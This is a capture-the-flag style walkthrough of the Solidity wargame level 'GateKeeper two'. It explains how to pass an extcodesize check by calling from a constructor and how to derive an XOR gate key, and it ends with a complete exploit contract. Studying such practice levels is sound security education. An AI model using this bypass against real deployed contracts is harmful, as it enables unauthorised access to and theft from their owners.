# Level 14 : GateKeeper two

**extcodesize:** In Solidity, we can use low-level codes by using assembly in YUL. They can be used inside **`assembly {...}`**. **`extcodesize`** is one such opcode that returns the code's size of any address.

**So how do we satisfy both gate 1 and 2's criteria?**

This is where constructor's come into play. During a contract's initialization, or when it's constructor is being called, its runtime code size will always be 0.

So when we put our exploit logic and call it from inside a constructor, the return value of `extcodesize` will always return zero. This essentially means that all our exploit code will be called from inside of our **contract's constructor** to go through the second gate.

Gate 3 : This is a simple XOR operation and we know that `A XOR B = C` is equal to `A XOR C = B`. Using this logic we can very easily find the value of the unknown `_gateKey` .

Remind that **`uint64**(0) - 1 == type(uint64).max)`

So here the value of the key is a `bytes8 of our address ^ (uint64(0)-1)`

⇒ `bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)); // Lot of conversion yes..`

Full code is like that : 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Hack{
    constructor() public {
        GatekeeperTwo level14 = GatekeeperTwo(//Yours);
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        level14.enter(_gateKey);
    }
}

contract GatekeeperTwo {....}
```